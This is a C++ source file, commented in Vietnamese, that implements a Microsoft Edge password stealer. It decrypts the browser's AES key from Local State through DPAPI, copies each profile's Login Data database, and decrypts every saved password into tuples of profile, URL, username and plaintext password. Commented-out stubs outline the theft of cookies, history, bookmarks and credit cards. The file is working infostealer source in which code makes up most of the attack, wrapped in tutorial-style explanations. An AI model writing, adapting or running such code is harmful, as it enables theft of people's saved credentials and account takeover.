

#include "edge_stealer.h"
#include <shlobj.h>     // Đối với SHGetKnownFolderPath
#include <fstream>      // Đối với ifstream
#include <sstream>      // Đối với stringstream
#include <vector>
#include <codecvt>      // Đối với wstring_convert
#include <locale>       // Đối với wstring_convert
#include <windows.h>
#include <wincrypt.h>   // Đối với CryptUnprotectData
#include <bcrypt.h>     // Đối với AES-GCM (BCryptDecrypt)
#include "sqlite3.h"    // Thư viện SQLite3

// Liên kết với các thư viện cần thiết
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "Bcrypt.lib")

using namespace std; 


/*
* 
    [Edge Local State] --(Base64 + DPAPI)--> AES Key
            |
            v
    [Login Data] --(copy)--> temp file
            |
            v
    [SQLite: logins]
            |
            +--> password_value:
                  |__ "v10" "v11"--> AES-GCM Decrypt
                  |__ else  --> DPAPI Decrypt
            |
            v
    [origin_url, username, password] --> credentials

    Vì sao có "v10" hoặc "v11"?
    Từ Chrome v80 trở lên, Google chuyển sang dùng AES-256-GCM để mã hóa password_value trong SQLite DB (Login Data).

    Để phân biệt dữ liệu mã hóa cũ và mới, họ thêm prefix "v10" hoặc "v11" vào đầu password_value:

   
    password_value = "v10" + iv (12 byte) + ciphertext + tag (16 byte)
    "v10" nghĩa là: Mật khẩu được mã hóa bằng AES-256-GCM, khóa lấy từ Local State.

    2. Nếu không có "v10" / "v11" thì sao?
    Các bản Chrome/Edge cũ hơn hoặc một số hệ thống vẫn mã hóa mật khẩu bằng DPAPI truyền thống:

    Dữ liệu là BLOB nhị phân, không có tiền tố.

    Windows tự giữ khóa, giải mã bằng CryptUnprotectData().

*/

// Hàm chuyển đổi std::string (UTF-8) sang std::wstring
    wstring StringToWString(const string& str) {
    if (str.empty()) return std::wstring();

    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
    std::wstring wstrTo(size_needed, 0);
    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
    return wstrTo;
}

// Hàm chuyển đổi std::wstring sang std::string (UTF-8)
std::string WStringToString(const std::wstring& wstr) {
    if (wstr.empty()) return std::string();
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}

// Hàm giải mã Base64
/*
BOOL CryptStringToBinaryA(
  LPCSTR pszString,       // chuỗi base64 input
  DWORD cchString,        // độ dài chuỗi
  DWORD dwFlags,          // loại mã hóa (BASE64)
  BYTE *pbBinary,         // output buffer
  DWORD *pcbBinary,       // độ dài buffer output (hoặc output actual size)
  DWORD *pdwSkip,         // bỏ qua ký tự nào không hợp lệ (không cần)
  DWORD *pdwFlags         // flag trạng thái output (không cần)
);



*/
vector<BYTE> Base64Decode(const string& input) {

    vector<BYTE> result;
    DWORD decodedSize = 0;
    // tính toán decode size , đây là 1 tríck 
    /*
    Trong rất nhiều WinAPI liên quan đến chuỗi hoặc buffer động, Microsoft thiết kế API theo kiểu:

    Gọi hàm lần đầu với outputBuffer = NULL, nó không xử lý thật, mà chỉ trả về kích thước cần cấp phát thông qua biến tham chiếu (pcbBinary trong trường hợp này)
    */
    if (!CryptStringToBinaryA(input.c_str(), input.length(), CRYPT_STRING_BASE64, NULL, &decodedSize, NULL, NULL)) { // true nếu thành công tính , false nếu gặp lỗi 
        return result;
    }
    result.resize(decodedSize);

    // Thực hiện giải mã
    if (!CryptStringToBinaryA(input.c_str(), input.length(), CRYPT_STRING_BASE64, result.data(), &decodedSize, NULL, NULL)) {
        // Lỗi khi giải mã
        result.clear();
    }
    return result;
}





/*
I. DPAPI là gì?
    DPAPI = Data Protection API
    Là API mã hoá/giải mã dữ liệu cá nhân trong Windows, do chính hệ điều hành quản lý khóa bí mật (master key) dựa trên:

    User logon session (SID)

    Password

    Hệ thống internal secrets

    => Tức là:
    Windows giữ khóa cho bạn

    Bạn chỉ cần gọi CryptProtectData() (mã hoá) và CryptUnprotectData() (giải mã)

    Dữ liệu được bảo vệ bởi chính tài khoản Windows
    Chỉ user đó (hoặc SYSTEM) có thể giải mã được



*/
// Hàm giải mã dữ liệu bằng DPAPI
vector<BYTE> DPAPIUnprotectData(const std::vector<BYTE>& encryptedData) {
    /*
    DATA_BLOB là struct chuẩn của WinAPI để wrap buffer nhị phân:
    typedef struct _CRYPTOAPI_BLOB {
      DWORD cbData;   // size
      BYTE* pbData;   // pointer to data
    } DATA_BLOB;
    */
    DATA_BLOB inputBlob;
    DATA_BLOB outputBlob;
    vector<BYTE> decryptedData;

    inputBlob.pbData = const_cast<BYTE*>(encryptedData.data());
    inputBlob.cbData = static_cast<DWORD>(encryptedData.size());


    /*
    BOOL CryptUnprotectData(
      DATA_BLOB *pDataIn,         // Dữ liệu cần giải mã
      LPWSTR *ppszDataDescr,      // Mô tả (NULL vì không cần)
      DATA_BLOB *pOptionalEntropy,// Có thể thêm entropy (mặc định NULL)
      PVOID pvReserved,           // luôn NULL
      CRYPTPROTECT_PROMPTSTRUCT*, // cấu trúc UI prompt (NULL nếu không UI)
      DWORD dwFlags,              // 0 nếu không có gì đặc biệt
      DATA_BLOB *pDataOut         // Output sau khi giải mã
);

    */
    if (CryptUnprotectData(&inputBlob, NULL, NULL, NULL, NULL, 0, &outputBlob)) {
        decryptedData.assign(outputBlob.pbData, outputBlob.pbData + outputBlob.cbData);
        LocalFree(outputBlob.pbData);
    }
    return decryptedData;
}

/*

                    [Input dữ liệu]
    +----------------------------------------------------------+
    | - key (32 bytes)    : khóa AES (256-bit)                 |
    | - iv  (12 bytes)    : Nonce / Initialization Vector      |
    | - tag (16 bytes)    : Authentication Tag (MAC)           |
    | - ciphertext (n)    : dữ liệu đã bị mã hóa               |
    +----------------------------------------------------------+

                                │
                                ▼

            ╔═════════════════════════════════════╗
            ║  BƯỚC 1: Mở provider AES             ║
            ╚═════════════════════════════════════╝
            ┌─────────────────────────────────────┐
            │ BCryptOpenAlgorithmProvider(        │
            │   BCRYPT_AES_ALGORITHM              │
            │ )                                   │
            └─────────────────────────────────────┘
                                │
                                ▼
            ╔═════════════════════════════════════╗
            ║  BƯỚC 2: Đặt chế độ AES-GCM          ║
            ╚═════════════════════════════════════╝
            ┌─────────────────────────────────────┐
            │ BCryptSetProperty(                  │
            │   BCRYPT_CHAINING_MODE = "GCM"      │
            │ )                                   │
            └─────────────────────────────────────┘
                                │
                                ▼
            ╔═════════════════════════════════════╗
            ║  BƯỚC 3: Tạo key đối xứng            ║
            ╚═════════════════════════════════════╝
            ┌─────────────────────────────────────┐
            │ BCryptGenerateSymmetricKey(         │
            │   key raw (vector<BYTE>)            │
            │ ) → hKey                            │
            └─────────────────────────────────────┘
                                │
                                ▼
            ╔═════════════════════════════════════╗
            ║  BƯỚC 4: Setup cấu trúc GCM info     ║
            ╚═════════════════════════════════════╝
            ┌─────────────────────────────────────┐
            │ BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO│
            │   - pbNonce = iv.data()             │
            │   - cbNonce = iv.size()             │
            │   - pbTag   = tag.data()            │
            │   - cbTag   = tag.size()            │
            └─────────────────────────────────────┘
                                │
                                ▼
            ╔═════════════════════════════════════╗
            ║  BƯỚC 5: Gọi hàm giải mã             ║
            ╚═════════════════════════════════════╝
            ┌─────────────────────────────────────┐
            │ BCryptDecrypt(                      │
            │   ciphertext,                       │
            │   authInfo (chứa iv + tag)          │
            │ ) → plaintext                       │
            └─────────────────────────────────────┘
                                │
                                ▼
                    [Output: Dữ liệu đã giải mã]

NTSTATUS BCryptOpenAlgorithmProvider(
  [out] BCRYPT_ALG_HANDLE *phAlgorithm,  // handle tới thuật toán aes
  [in]  LPCWSTR           pszAlgId,    // loại thuật toán 
  [in]  LPCWSTR           pszImplementation,
  [in]  ULONG             dwFlags
);

*/
// Hàm giải mã AES-256-GCM
vector<BYTE> AESGCMDecrypt(const vector<BYTE>& key, const vector<BYTE>& iv, const vector<BYTE>& tag, const vector<BYTE>& ciphertext) {
    vector<BYTE> decryptedText;
    NTSTATUS status = 0;

    BCRYPT_ALG_HANDLE hAlg = NULL; // handle đại diện cho thuật toán ở đây là aes 
    BCRYPT_KEY_HANDLE hKey = NULL;  // Handle đại diện cho một key đã khởi tạo xong → dùng để mã hóa/giải mã

    // bước 1 mở 1 nhà  cung cấp thuật toán AES
    /*
    Kết quả trả về là một handle (BCRYPT_ALG_HANDLE). Handle này là một con trỏ mờ (opaque pointer), 
    đại diện cho phiên làm việc của chúng ta với provider AES.
    */
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);


    /*
    → Nếu status ≥ 0 → OK
    → Nếu status < 0 → Toang, API lỗi
    */
    if (!BCRYPT_SUCCESS(status)) {
        return decryptedText;
    }


    // bước 2  Thiết lập chế độ GCM
    /*
    
    status = BCryptSetProperty(
    hAlg,                            // handle tới thuật toán AES
    BCRYPT_CHAINING_MODE,           // tên thuộc tính muốn set
    (PBYTE)BCRYPT_CHAIN_MODE_GCM,   // giá trị: "GCM"
    sizeof(BCRYPT_CHAIN_MODE_GCM),  // độ dài chuỗi "GCM"
    0                                // flags
    );
    */
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return decryptedText;
    }

    // bước 3  Tạo hoặc nhập khóa đối xứng
    /*
    Tên hàm này hơi gây hiểu nhầm. Trong trường hợp này, nó không "tạo ra" (generate) một khóa ngẫu nhiên mới. 
    Thay vào đó, nó nhập (imports) chuỗi byte thô của khóa (key raw) vào và tạo ra một đối tượng khóa mà provider có thể hiểu và làm việc.
    Nó nhận vào provider handle (đã được cấu hình GCM), chuỗi byte thô của khóa, và trả về một handle khóa (BCRYPT_KEY_HANDLE).

    NTSTATUS BCryptGenerateSymmetricKey(
      BCRYPT_ALG_HANDLE hAlgorithm,    // hanlde thuật toán AES đã mở
      BCRYPT_KEY_HANDLE *phKey,        // output: nơi trả về key handle
      PUCHAR pbKeyObject,              // bộ nhớ nội bộ cho key (optional)
      ULONG cbKeyObject,               // kích thước bộ nhớ nội bộ
      PUCHAR pbSecret,                 // khóa raw (32 bytes nếu AES-256)
      ULONG cbSecret,                  // kích thước khóa
      ULONG dwFlags                    // flags (0)
    );

    */
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PBYTE)key.data(), (ULONG)key.size(), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return decryptedText;
    }


    // bước 4 Setup cấu trúc GCM info
    /*
    Struct hoạt động như thế nào?

    Đây là một cấu trúc dữ liệu được định nghĩa sẵn để chứa tất cả các thông tin bổ sung mà một chế độ mã hóa xác thực (Authenticated Encryption mode) cần đến.
    Hàm BCryptDecrypt được thiết kế để hoạt động với nhiều chế độ, nên nó cần một cách chung để nhận các tham số đặc thù của từng chế độ. Struct này chính là cách đó.
    Giải thích chi tiết cấu trúc BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO:

    C++

    typedef struct _BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO {
        ULONG cbSize;           // Kích thước của struct, phải được khởi tạo.
        ULONG dwInfoVersion;    // Phiên bản, phải là BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION.
        PBYTE pbNonce;          // Con trỏ tới vùng nhớ chứa IV/Nonce.
        ULONG cbNonce;          // Kích thước của IV/Nonce (ví dụ: 12 bytes).
        PBYTE pbAuthData;       // Con trỏ tới Dữ liệu Xác thực Kèm theo (Associated Data - AAD). 
                                // Đây là dữ liệu không được mã hóa nhưng được xác thực (ví dụ: header của gói tin).
        ULONG cbAuthData;       // Kích thước của AAD.
        PBYTE pbTag;            // Con trỏ tới vùng nhớ chứa Authentication Tag.
        ULONG cbTag;            // Kích thước của Tag (ví dụ: 16 bytes).
        PBYTE pbMacContext;     // Dùng cho streaming, tạm thời không xét.
        ULONG cbMacContext;
        ULONG dwFlags;          // Các cờ bổ sung.
    } BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO;
    Lưu ý quan trọng: Trước khi sử dụng, bạn phải gọi macro BCRYPT_INIT_AUTH_MODE_INFO(authInfo); để khởi tạo cbSize và dwInfoVersion một cách chính xác.
    */
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = (PBYTE)iv.data();
    authInfo.cbNonce = (ULONG)iv.size();
    authInfo.pbTag = (PBYTE)tag.data(); // Tag được cung cấp riêng cho BCryptDecrypt trong GCM
    authInfo.cbTag = (ULONG)tag.size();
   
    /*
    authInfo.pbMacContext = NULL; // Không cần cho GCM
    authInfo.cbMacContext = 0;
    authInfo.pbAAD = NULL; // Không có AAD trong trường hợp này
    authInfo.cbAAD = 0;
    authInfo.dwFlags = 0;
     */



    /*
    NTSTATUS BCryptDecrypt(
      BCRYPT_KEY_HANDLE hKey,         // Handle của key AES
      PUCHAR pbInput,                 // Con trỏ dữ liệu bị mã hoá (ciphertext)
      ULONG cbInput,                  // Kích thước ciphertext
      VOID* pPaddingInfo,             // Cấu trúc padding/GCM info
      PUCHAR pbIV,                    // Không dùng nếu dùng GCM (→ NULL)
      ULONG cbIV,                     // Không dùng nếu dùng GCM
      PUCHAR pbOutput,                // Buffer output: plaintext
      ULONG cbOutput,                 // Kích thước buffer output
      ULONG* pcbResult,               // Output: số byte thực tế được giải mã
      ULONG dwFlags                   // Cờ: padding kiểu nào (0 = none, hoặc `BCRYPT_BLOCK_PADDING`)
    );

    */
    ULONG decryptedLen = 0;
    // Lấy kích thước bộ đệm cần thiết cho văn bản đã giải mã
    status = BCryptDecrypt(hKey, (PBYTE)ciphertext.data(), (ULONG)ciphertext.size(), &authInfo, NULL, 0, NULL, 0, &decryptedLen, 0);
    if (!BCRYPT_SUCCESS(status)) { // nếu lấy k thành công 
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return decryptedText;
    }

    decryptedText.resize(decryptedLen);
    // gọi lại lần nữ khi có size chính sác Thực hiện giải mã
    status = BCryptDecrypt(hKey, (PBYTE)ciphertext.data(), (ULONG)ciphertext.size(), &authInfo, NULL, 0, decryptedText.data(), decryptedLen, &decryptedLen, 0);
    if (!BCRYPT_SUCCESS(status)) {
        // Lỗi giải mã, có thể do tag không khớp hoặc khóa sai
        decryptedText.clear();
    }

    // Dọn dẹp
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return decryptedText;
}


// Hàm helper để tìm tất cả các profile của Edge
vector<wstring> GetAllEdgeProfiles(const wstring& userDataPath) {
    vector<wstring> profiles;

    // Thêm profile mặc định
    profiles.push_back(L"Default");

    // Tìm các profile từ Profile 1 đến Profile 5
    for (int i = 1; i <= 5; i++) {
        wstring profileName = L"Profile " + to_wstring(i);
        wstring profilePath = userDataPath + L"\\" + profileName;

        // Kiểm tra xem thư mục profile có tồn tại không
        if (GetFileAttributesW(profilePath.c_str()) != INVALID_FILE_ATTRIBUTES) {
            // Kiểm tra xem file Login Data có tồn tại trong profile không
            wstring loginDataPath = profilePath + L"\\Login Data";
            if (GetFileAttributesW(loginDataPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
                profiles.push_back(profileName);
            }
        }
    }

    return profiles;
}





// Triển khai edge_stealer.h 

EdgeStealer::EdgeStealer() {
    // Constructor - có thể khởi tạo các tài nguyên cần thiết ở đây
}

EdgeStealer::~EdgeStealer() {
    // Destructor - giải phóng tài nguyên nếu cần
}

// Phương thức riêng tư để lấy khóa AES của Edge
// Trong header, kiểu trả về là std::string, nhưng vector<BYTE> an toàn hơn cho dữ liệu nhị phân.
// Chúng ta sẽ trả về vector<BYTE> và chuyển đổi khi cần hoặc điều chỉnh header.
// Hiện tại, chúng ta sẽ tuân theo header và chuyển đổi vector<BYTE> thành string.
string EdgeStealer::GetEdgeAESKey() {
    string aesKeyStr;
    PWSTR localAppDataPath = NULL;   // Output: con trỏ tới đường dẫn
    /*
    HRESULT SHGetKnownFolderPath(
      REFKNOWNFOLDERID rfid,  // Mã định danh folder
      DWORD dwFlags,          // Cờ (để expand env var, v.v.)
      HANDLE hToken,          // Nếu NULL thì là user hiện tại
      PWSTR *ppszPath         // Output: con trỏ tới đường dẫn
    );
    | Tên folder                | Ý nghĩa                          |
    | ------------------------- | -------------------------------- |
    | `FOLDERID_RoamingAppData` | `%APPDATA%` (AppData\Roaming)    |
    | `FOLDERID_LocalAppData`   | `%LOCALAPPDATA%` (AppData\Local) |
    | `FOLDERID_Desktop`        | Desktop                          |
    | `FOLDERID_Documents`      | Documents                        |
    | `FOLDERID_Downloads`      | Downloads                        |

    */
    // 1. Lấy đường dẫn đến thư mục %LOCALAPPDATA%
    if (FAILED(SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &localAppDataPath))) {
        return aesKeyStr; // Trả về chuỗi rỗng nếu lỗi
    }

    wstring localStatePathW = localAppDataPath;
    CoTaskMemFree(localAppDataPath); // Giải phóng bộ nhớ được cấp phát bởi SHGetKnownFolderPath
    localStatePathW += L"\\Microsoft\\Edge\\User Data\\Local State";

    // 2. Mở đẻ Đọc file Local State (JSON)
    ifstream localStateFile(localStatePathW);
    if (!localStateFile.is_open()) {
        return aesKeyStr;
    }

    stringstream buffer;
    buffer << localStateFile.rdbuf();
    localStateFile.close();
    string localStateContent = buffer.str();

    // 3. Lấy giá trị "encrypted_key" (Base64) từ JSON
    // Đây là một trình phân tích JSON rất đơn giản, chỉ để minh họa.
    // Nên sử dụng một thư viện JSON đầy đủ (ví dụ: nlohmann/json) cho môi trường sản xuất.
    string encryptedKeyBase64;
    size_t keyPos = localStateContent.find("\"encrypted_key\":\"");
    if (keyPos != string::npos) {
        keyPos += strlen("\"encrypted_key\":\"");
        size_t endPos = localStateContent.find("\"", keyPos);
        if (endPos != std::string::npos) {
            encryptedKeyBase64 = localStateContent.substr(keyPos, endPos - keyPos);
        }
    }

    if (encryptedKeyBase64.empty()) {
        return aesKeyStr;
    }

    // 4. Giải mã Base64 để thu được encrypted_key dạng nhị phân
    vector<BYTE> encryptedKeyBytes = Base64Decode(encryptedKeyBase64);
    if (encryptedKeyBytes.empty()) {
        return aesKeyStr;
    }

    // 5. Kiểm tra và loại bỏ tiền tố DPAPI ("DPAPI" - 5 bytes)
    const char dpapiPrefix[] = "DPAPI";
    if (encryptedKeyBytes.size() <= 5 || memcmp(encryptedKeyBytes.data(), dpapiPrefix, 5) != 0) {
        // Không có tiền tố DPAPI hoặc key quá ngắn
        return aesKeyStr;
    }
    vector<BYTE> keyToUnprotect(encryptedKeyBytes.begin() + 5, encryptedKeyBytes.end());

    // 6. Giải mã encrypted_key bằng Windows DPAPI
    vector<BYTE> decryptedAesKeyBytes = DPAPIUnprotectData(keyToUnprotect);
    if (decryptedAesKeyBytes.empty()) {
        return aesKeyStr;
    }

    // Chuyển đổi vector<BYTE> thành string để phù hợp với khai báo trong header
    aesKeyStr.assign(reinterpret_cast<char*>(decryptedAesKeyBytes.data()), decryptedAesKeyBytes.size());
    return aesKeyStr;
}

vector<tuple<string, string, string, string>> EdgeStealer::StealPasswords() {
    vector<tuple<string, string, string, string>> credentials;

    // 1. Lấy khóa AES
    string aesKeyStr = GetEdgeAESKey();
    if (aesKeyStr.empty()) {
        return credentials; // Không lấy được khóa, không thể giải mã
    }
    // chuyển key về dạng byte 
    vector<BYTE> aesKey(aesKeyStr.begin(), aesKeyStr.end());

    // 2. Xác định đường dẫn đến thư mục User Data của Edge
    PWSTR localAppDataPath = NULL;
    if (FAILED(SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &localAppDataPath))) {
        return credentials;
    }
    wstring userDataPathW = localAppDataPath;
    CoTaskMemFree(localAppDataPath);
    userDataPathW += L"\\Microsoft\\Edge\\User Data";

    // 3. Tìm tất cả các profile trong thư mục User Data
    vector<wstring> profiles = GetAllEdgeProfiles(userDataPathW);

    // 4. Duyệt qua từng profile
    for (const auto& profile : profiles) {
        wstring loginDataPathW = userDataPathW + L"\\" + profile + L"\\Login Data";

        // Chuyển đổi profile name sang string để lưu vào kết quả
        string profileName = WStringToString(profile);

        // Kiểm tra xem file Login Data có tồn tại không
        if (GetFileAttributesW(loginDataPathW.c_str()) == INVALID_FILE_ATTRIBUTES) {
            continue; // File không tồn tại, bỏ qua profile này
        }

        // 5. Sao chép database "Login Data" để tránh xung đột
        wstring tempLoginDataPathW = loginDataPathW + L"_temp";
        if (!CopyFileW(loginDataPathW.c_str(), tempLoginDataPathW.c_str(), FALSE)) {
            continue; // Không thể sao chép file, bỏ qua profile này
        }

        // 6. Kết nối vào SQLite database (bản sao)
        sqlite3* db;
        // Chuyển đổi wstring sang string (UTF-8) cho sqlite3_open
        string tempLoginDataPathA = WStringToString(tempLoginDataPathW);

        if (sqlite3_open(tempLoginDataPathA.c_str(), &db) != SQLITE_OK) {
            DeleteFileW(tempLoginDataPathW.c_str()); // Xóa file tạm
            continue; // Không thể mở database, bỏ qua profile này
        }

        // 7. Truy vấn bảng "logins"
        const char* sqlQuery = "SELECT origin_url, username_value, password_value FROM logins";
        sqlite3_stmt* stmt;

        if (sqlite3_prepare_v2(db, sqlQuery, -1, &stmt, NULL) == SQLITE_OK) {
            // 8. Vòng lặp qua từng entry
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                string originUrl = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                string username = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));

                const BYTE* passwordBlob = reinterpret_cast<const BYTE*>(sqlite3_column_blob(stmt, 2));
                int passwordBlobSize = sqlite3_column_bytes(stmt, 2);
                vector<BYTE> encryptedPassword(passwordBlob, passwordBlob + passwordBlobSize);
                string decryptedPasswordStr;

                if (encryptedPassword.empty()) continue;

                // 9. Kiểm tra định dạng mã hóa của password_value
                if (passwordBlobSize > 3 && passwordBlob[0] == 'v' && passwordBlob[1] == '1' && (passwordBlob[2] == '0' || passwordBlob[2] == '1')) {
                    // Tiền tố là "v10" hoặc "v11" (AES-GCM)
                    // Cấu trúc: "v10" (3 byte) + IV (12 byte) + Ciphertext (N byte) + Auth Tag (16 byte)
                    if (passwordBlobSize < (3 + 12 + 0 + 16)) { // 3 (prefix) + 12 (nonce) + 16 (tag)
                        continue; // Dữ liệu không đủ dài
                    }
                    vector<BYTE> iv(encryptedPassword.begin() + 3, encryptedPassword.begin() + 3 + 12);
                    vector<BYTE> ciphertext(encryptedPassword.begin() + 3 + 12, encryptedPassword.end() - 16);
                    vector<BYTE> tag(encryptedPassword.end() - 16, encryptedPassword.end());

                    vector<BYTE> decryptedPasswordBytes = AESGCMDecrypt(aesKey, iv, tag, ciphertext);
                    if (!decryptedPasswordBytes.empty()) {
                        decryptedPasswordStr.assign(reinterpret_cast<char*>(decryptedPasswordBytes.data()), decryptedPasswordBytes.size());
                    }
                }
                else {
                    // Không có tiền tố v10/v11 (DPAPI cũ)
                    vector<BYTE> decryptedPasswordBytes = DPAPIUnprotectData(encryptedPassword);
                    if (!decryptedPasswordBytes.empty()) {
                        decryptedPasswordStr.assign(reinterpret_cast<char*>(decryptedPasswordBytes.data()), decryptedPasswordBytes.size());
                    }
                }

                if (!decryptedPasswordStr.empty()) {
                    credentials.emplace_back(profileName, originUrl, username, decryptedPasswordStr);
                }
            }
        }

        // 10. Đóng kết nối SQLite, xóa file tạm thời
        sqlite3_finalize(stmt);
        sqlite3_close(db);
        DeleteFileW(tempLoginDataPathW.c_str());
    }

    return credentials;
}







//// Các phương thức khác (chưa triển khai đầy đủ, trả về vector rỗng)
//vector<tuple<string, string, string>> EdgeStealer::StealCookies() {
//    // Logic tương tự như StealPasswords nhưng cho file Cookies và giải mã cookie
//    // Cần lấy khóa AES, sao chép file Cookies, truy vấn SQLite, giải mã giá trị cookie
//    // Giá trị cookie cũng có thể được mã hóa bằng AES-GCM hoặc DPAPI
//    return vector<tuple<string, string, string>>();
//}
//
//vector<tuple<string, string, long long>> EdgeStealer::StealHistory() {
//    // Logic để đọc file History (SQLite)
//    // Không yêu cầu giải mã phức tạp như mật khẩu hay cookie
//    return vector<tuple<string, string, long long>>();
//}
//
//vector<tuple<string, string>> EdgeStealer::StealBookmarks() {
//    // Logic để đọc file Bookmarks (JSON)
//    // Không yêu cầu giải mã
//    return vector<tuple<string, string>>();
//}
//
//vector<tuple<string, string, string>> EdgeStealer::StealCreditCards() {
//    // Logic để đọc file Web Data (SQLite), bảng credit_cards
//    // Yêu cầu giải mã tương tự như mật khẩu (sử dụng cùng khóa AES)
//    return vector<tuple<string, string, string>>();
//}

